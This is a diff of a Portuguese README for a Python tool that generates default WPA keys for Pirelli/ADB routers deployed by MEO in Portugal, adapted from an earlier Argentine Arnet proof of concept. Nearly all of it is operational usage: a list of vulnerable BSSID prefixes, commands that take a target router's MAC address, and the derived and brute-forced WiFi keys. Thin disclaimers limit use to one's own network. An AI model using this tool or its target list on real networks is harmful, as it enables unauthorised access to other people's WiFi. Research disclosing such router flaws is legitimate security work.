@@ -6,11 +6,13 @@ Vulnerabilidades nos Routers ADB Italia da MEO.
 Referencias
 ----
 
-* O autor do codigo é [Eduardo Novella](https://twitter.com/enovella_) ([repositório original](https://bitbucket.org/dudux/adbpirelli))  que encontrou a vulnerabilidade nos routers ADB utilizado na Argentina pela operadora Arnet. O codigo neste repositorio encontra-se modificado de modo a funcionar nos routers da MEO.
+* O autor do codigo é [Eduardo Novella](https://twitter.com/enovella_) ([repositório original](https://bitbucket.org/dudux/adbpirelli))  que encontrou a vulnerabilidade nos routers ADB utilizado na Argentina pela operadora Arnet. O codigo neste repositorio encontra-se modificado de modo a funcionar nos routers da MEO com o SSID "ADSLPT-ABXXXXX". Eu não sou o seu autor!
 
 Aviso
 ----
-Não me responsabilizo por qualquer problema que lhe possa causar o uso indevido deste codigo, seja de que forma for. Este codigo serve apenas para testar a segurança das redes WiFi
+Não me responsabilizo por qualquer problema que o uso indevido deste codigo, te possa causar seja de que forma for. 
+Este codigo serve apenas para testar a segurança da tua rede, pelo que se usares este codigo noutra rede que não seja
+a tua não serei responsavel!!
 
 Licence
 ----
@@ -19,77 +21,70 @@ http://gplv3.fsf.org/
 
 Mais info
 ----
-
 + http://ednolo.alumnos.upv.es/?p=1883
 
 Utilização
 
-O codigo foi escrito em Python
+O codigo é escrito em Python
 ----
 
-	$ python pirelli.py -v
-	pirelli.py 1.4 [2015-05-06] ----> http://www.ednolo.alumnos.upv.es
+	$ python MEO.py -v
+	MEO.py 1.5 [2015-07-20] ----> https://github.com/AndrewGomes/ADSLPT-WPA
 
-	$ python pirelli.py 
-	usage: pirelli.py [-h] [-b [BSSID]] [-v] [-l | -a]
+	$ python MEO.py 
+	usage: MEO.py [-h] [-b [BSSID]] [-v] [-l | -a]
 
-	>>> PoC WPA keygen for WiFi Networks deployed by Arnet in Argentina and MEO in
-	Portugal. So far only WiFi networks with essids like WiFi-Arnet-XXXX or
-	ADSLPT-ABXXXXX and manufactured by Pirelli are likely vulnerable. See
-	http://ednolo.alumnos.upv.es/ for more details. Twitter: @enovella_ and email:
-	ednolo[at]inf.upv.es. This software is used just as proof-of-concept, commit
-	fraud depends on you!
+	>>> Keygen para as redes WiFi da MEO com o SSID ADSLPT-ABXXXXX Não me
+	responsabilizo por qualquer problema que o uso indevido deste codigo, te possa
+	causar seja de que forma for. Este codigo serve apenas para testar a
+	segurança da tua rede, pelo que se usares este codigo noutra rede que não
+	seja a tua não serei responsavel!!
+
 
 	optional arguments:
 	  -h, --help            show this help message and exit
-	  -v, --version         show program's version number and exit
-	  -l, --list            List all vulnerable targets
-	  -a, --allkeys         Bruteforce mode
+	  -v, --versão         show program's version number and exit
+	  -l, --list            Mostrar vulnerabilidades
+	  -a, --allkeys         Bruteforce
 
 	required:
 	  -b [BSSID], --bssid [BSSID]
-	                        Target mac address
+	                        Endereço MAC do Router
 
-	(+) Help: python pirelli.py -b 74:88:8B:AD:C0:DE
+	(+) Ajuda: python MEO.py -b 11:22:33:44:55:66
 
-	$ python pirelli.py -l
-	[+] Possible vulnerable targets so far:
-		 bssid: 00:08:27:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
-		 bssid: 00:13:C8:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
-		 bssid: 00:17:C2:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
-		 bssid: 00:19:3E:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
-		 bssid: 00:1C:A2:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
-		 bssid: 00:1D:8B:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
-		 bssid: 00:22:33:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
-		 bssid: 00:8C:54:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
-		 bssid: 30:39:F2:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
-		 bssid: 74:88:8B:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
-		 bssid: 84:26:15:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
-		 bssid: A4:52:6F:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
-		 bssid: A4:5D:A1:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
-		 bssid: D0:D4:12:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
-		 bssid: D4:D1:84:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
-		 bssid: DC:0B:1A:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
-		 bssid: F0:84:2F:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
 
-	$ python pirelli.py -b 74:88:8B:AD:C0:DE
-	[+] MAC     : 74:88:8B:AD:C0:DE
-	[+] WPA key : 057mjyggor	SSID: WiFi-Arnet-XXXX (Argentina)
-	[+] WPA key : 057mjygg  	SSID: ADSLPT-ABXXXXX  (Portugal)
+	$ python MEO.py -l
+	[+] Possiveis alvos:
+		 bssid: 00:08:27:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
+		 bssid: 00:13:C8:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
+		 bssid: 00:17:C2:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
+		 bssid: 00:19:3E:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
+		 bssid: 00:1C:A2:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
+		 bssid: 00:1D:8B:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
+		 bssid: 00:22:33:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
+		 bssid: 00:8C:54:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
+		 bssid: 30:39:F2:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
+		 bssid: 74:88:8B:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
+		 bssid: 84:26:15:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
+		 bssid: A4:52:6F:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
+		 bssid: A4:5D:A1:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
+		 bssid: D0:D4:12:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
+		 bssid: D4:D1:84:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
+		 bssid: DC:0B:1A:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
+		 bssid: F0:84:2F:XX:XX:XX 	 SSID: ADSLPT-ABXXXXX
 
-	$ python pirelli.py -b 74:88:8B:AD:C0:DE -a
-	[+] MAC     : 74:88:8B:AD:C0:DE
 
-	[+] WPA keys for SSID: WiFi-Arnet-XXXX (Argentina)
-	3c1nrhqy5z
-	tugh1hcfog
-	057mjyggor
-	hj0wl2c2r7
-	9yw6um3tc5
-	ituqajo8iq
+	$ python MEO.py -b 11:22:33:44:55:66
+	[+] MAC     : 11:22:33:44:55:66
+	[+] WPA key : 057mjygg  	SSID: ADSLPT-ABXXXXX
+
+	$ python MEO.py -b 11:22:33:44:55:66 -a
+	[+] MAC     : 11:22:33:44:55:66
+
 	wfti5odq8c
 
-	[+] WPA keys for SSID: ADSLPT-ABXXXXX  (Portugal)
+	[+] Chaves possiveis para o SSID: ADSLPT-ABXXXXX
 	3c1nrhqy  
 	tugh1hcf  
 	057mjygg  
